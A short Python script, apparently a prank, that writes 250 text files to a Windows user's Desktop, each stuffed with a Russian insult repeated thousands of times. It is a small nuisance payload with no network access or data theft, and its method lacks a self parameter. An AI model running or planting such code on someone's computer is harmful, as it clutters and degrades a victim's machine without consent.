from random import randint as r
import os

class Desktop:
    def txt():
        chars = ("qwertyuiopasdfghjkl;zxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM!@#$%^&*()1234567890")
        user = os.getenv("USERPROFILE")
        for i in range(0,250):
            filename = user + rf"\\Desktop\\MonzeN {i}.txt"
            with open(filename, mode ='w+')as file:
                for i in range(150):
                    for p in range(150):
                        file.write('ЛОХ')
                    file.write('\n')




